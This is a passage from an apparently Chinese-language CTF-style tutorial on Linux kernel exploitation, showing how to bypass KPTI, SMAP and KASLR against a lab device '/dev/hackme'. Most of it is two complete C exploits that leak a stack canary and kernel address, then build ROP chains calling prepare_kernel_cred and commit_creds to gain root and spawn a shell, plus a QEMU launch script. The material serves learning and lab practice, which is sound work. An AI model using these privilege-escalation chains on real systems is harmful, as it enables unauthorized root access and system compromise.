可以看到在该函数的内部存在修改`CR3`的操作，因此只需要调用该函数，就可以从内核空间的页表修改为用户空间的页表，但是该函数的起始位置会进行非常多的弹栈操作，如果直接使用很容易造成`ROP`链的空间不足，因此可以选择在`swapgs_restore_regs_and_return_to_usermode
+ 0x16`的位置开始执行。

![202307031555900.png](https://image.3001.net/images/20230704/1688435835_64a37c7b12b488178b1ba.png!small)

在该函数后续的执行中，还会执行`swapgs`的指令，切换`GS`的寄存器，并且做一个绝对跳转到`0xffffffff81200fco`

![202307031555901.png](https://image.3001.net/images/20230704/1688435837_64a37c7d3f07f81df2887.png!small)

在该地址的后续还存在这`iretq`的指令，因此该函数具备了所有的条件。

![202307031555902.png](https://image.3001.net/images/20230704/1688435838_64a37c7e7574cc98201b3.png!small)

 **exp**

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    ​  
    /*  
    0xffffffff814c6410 T commit_creds   
    0xffffffff814c67f0 T prepare_kernel_cred   
    0xffffffff823d6b02: cmp rdi, 0xffffff; ret;  
    0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    0xffffffff8166ff23: mov rdi, rax; jne 0x86fef3; pop rbx; pop rbp; ret;  
    0xffffffff81006370: pop rdi; ret;  
    0xffffffff8100a55f: swapgs; pop rbp; ret;   
    0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    0xffffffff814381cb: iretq; pop rbp; ret;  
    0xffffffff8150b97e: pop rsi; ret;  
    0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode  
    */  
    ​  
    //iretq RIP|CS|RFLAGS|SP|SS  
    unsigned long user_cs,user_rflags,user_sp,user_ss;  
    void save_state()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    puts("***save state***");  
    printf("user_cs:0x%lx\n", user_cs);  
    printf("user_sp:0x%lx\n", user_sp);  
    printf("user_ss:0x%lx\n", user_ss);  
    printf("user_rflags:0x%lx\n", user_rflags);  
    puts("***save finish***");  
    }  
    ​  
    void backdoor()  
    {  
    puts("***getshell***");  
    system("/bin/sh");  
    }
    
    
    int main()  
    {  
    save_state();  
    int fd = open("/dev/hackme", O_RDWR);  
    unsigned long buf[256];  
    read(fd, buf, 0x10 * 8);  
    for(int i = 0; i < 0x10; i++)  
    printf("i:%d\taddress:0x%lx\n",i, buf[i]);  
    unsigned long canary = buf[2];  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
      
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff81006370; //pop_rdi_ret  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814c67f0; //prepare_kernel_cred  
    payload[index++] = 0xffffffff8150b97e; //pop_rsi_ret  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff81006370; //pop_rdi_ret  
    payload[index++] = 1;  
    payload[index++] = 0xffffffff818c6b35; //add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0xffffffff8166fea3; //mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0xffffffff814c6410; //commit_creds;  
    payload[index++] = 0xffffffff81200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)backdoor;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);  
      
    }

## 绕过SMAP

`SMAP`则是防止在内核态时访问用户态的空间，此时使用`swapgs_restore_regs_and_return_to_usermode`函数也是完全可以绕过的，因此可以直接使用`swapgs_restore_regs_and_return_to_usermode`构建的`ROP`链。

但是如果遇到长度不够时，就能够将栈迁移到用户空间上了，因为在开启`SMAP`保护的时候就没有办法访问用户空间。那么此时只能借助内核的其他空间进行栈迁移，该手法利用比较复杂，因此留到以后再介绍。

## 绕过KASLR

`KASLR`与用户态下的`ASLR`差不多，都是开启了地址的随机化，因此不能使用绝对地址。

 **run.sh**

    
    
    qemu-system-x86_64 \  
    -m 128M \  
    -cpu kvm64,+smep,+smap \  
    -kernel vmlinuz \  
    -initrd initramfs.cpio.gz \  
    -hdb flag.txt \  
    -snapshot \  
    -nographic \  
    -monitor /dev/null \  
    -no-reboot \  
    -append "console=ttyS0  kaslr nofgkaslr kpti=1  quiet panic=1" \  
    -s

 **泄露内核地址**

通过泄露内核的程序基地址，再加上函数的偏移即可绕过，与用户态下的利用没有区别。

 **exp**

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    ​  
    /*  
    0xffffffff814c6410 T commit_creds --  [-3701815]  
    0xffffffff814c67f0 T prepare_kernel_cred -- [-3700823]  
    0xffffffff823d6b02: cmp rdi, 0xffffff; ret; -- [12094139]  
    0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; -- [-1958308]  
    0xffffffff81006370: pop rdi; ret;  --  [-8682711]  
    0xffffffff8100a55f: swapgs; pop rbp; ret; -- [-8665832]  
    0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; -- [494318]  
    0xffffffff814381cb: iretq; pop rbp; ret; -- [-4284028]  
    0xffffffff8150b97e: pop rsi; ret; -- [-3417801]  
    0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode -- [-6607159]  
    */  
    ​  
    //iretq RIP|CS|RFLAGS|SP|SS  
    unsigned long user_cs,user_rflags,user_sp,user_ss;  
    void save_state()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "mov user_ss, ss;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    puts("***save state***");  
    printf("user_cs:0x%lx\n", user_cs);  
    printf("user_sp:0x%lx\n", user_sp);  
    printf("user_ss:0x%lx\n", user_ss);  
    printf("user_rflags:0x%lx\n", user_rflags);  
    puts("***save finish***");  
    }  
    ​  
    void backdoor()  
    {  
    puts("***getshell***");  
    system("/bin/sh");  
    }
    
    
    int main()  
    {  
    save_state();  
    int fd = open("/dev/hackme", O_RDWR);  
    unsigned long buf[256];  
    read(fd, buf, 0x10 * 8);  
    for(int i = 0; i < 0x10; i++)  
    printf("i:%d\taddress:0x%lx\n",i, buf[i]);  
    unsigned long canary = buf[2];  
    unsigned long payload[256];  
    unsigned int index = 0;  
    for(int i = 0; i < (16); i ++)  
    payload[index++] = 0;  
    unsigned long leak_addr = buf[10];  
    printf("leak addr:0x%lx\n", leak_addr);  
    //iretq RIP|CS|RFLAGS|SP|SS  
    payload[index++] = canary;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = leak_addr - 8682711; //pop_rdi_ret  
    payload[index++] = 0;  
    payload[index++] = leak_addr - 3700823; //prepare_kernel_cred  
    payload[index++] = leak_addr - 3417801; //pop_rsi_ret  
    payload[index++] = 0;  
    payload[index++] = leak_addr - 8682711; //pop_rdi_ret  
    payload[index++] = 1;  
    payload[index++] = leak_addr + 494318; //add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = leak_addr - 1958308; //mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret;   
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = leak_addr - 3701815; //commit_creds;  
    payload[index++] = leak_addr - 6607159 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)backdoor;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
    write(fd, payload, index * 8);  
      
    }

